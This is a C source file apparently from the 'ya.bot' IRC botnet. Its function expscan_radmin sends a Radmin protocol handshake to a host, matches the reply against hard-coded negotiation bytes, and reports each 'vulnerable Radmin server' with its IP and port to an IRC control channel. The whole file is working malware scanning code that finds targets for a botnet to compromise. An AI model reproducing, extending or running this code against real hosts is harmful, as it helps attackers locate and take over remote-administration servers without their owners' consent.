/*  ya.bot  */

#include "..\..\bot\bot.h"

#ifndef NO_EXPSCAN
#ifndef NO_EXPSCANRADMIN
bool expscan_radmin(SExpScanInfo s_esi)
{
	char initiate[] =
			"\x01\x01\x00\x00\x00\x01\x00\x00\x00\x08\x08";
	char negotiate1[] =
			"\x01\x00\x00\x00\x37\x02\x00\x00\x16\x08\x00\x00\x02\x08\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	char negotiate2[] =
			"\x01\x00\x00\x00\x37\x10\x00\x01\x16\x08\x01\x00\x10\x08\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	char szBuffer[IRCBUF];

#ifndef NO_DEBUG
		debug_print("Exploit scanning Radmin, expscan_radmin()");
#endif

	if (s_esi.m_csock == INVALID_SOCKET)
			return FALSE;
	if (send(s_esi.m_csock, initiate, strlen(initiate), 0) == SOCKET_ERROR)
			return FALSE;
	if (expscan_recv(s_esi.m_csock, szBuffer, sizeof(szBuffer) - 1, 0) == SOCKET_ERROR)
			return FALSE;
	if ((!strstr(szBuffer, negotiate1)) && (!strstr(szBuffer, negotiate2)))
			return FALSE;
	if (!s_esi.m_bSilent)
			irc_message(s_esi.m_bsock, (char *)string_ircprivmsg, s_esi.m_szResultChannel,
					"%s%s%s%s vulnerable Radmin server found %sat:%s %s:%i.",
					CGREEN, string_replyexpscan, CEND, string_replydotbot,
					CBLUE, CEND, s_esi.m_szIP, s_esi.m_nPort);
		return TRUE;
}
#endif
#endif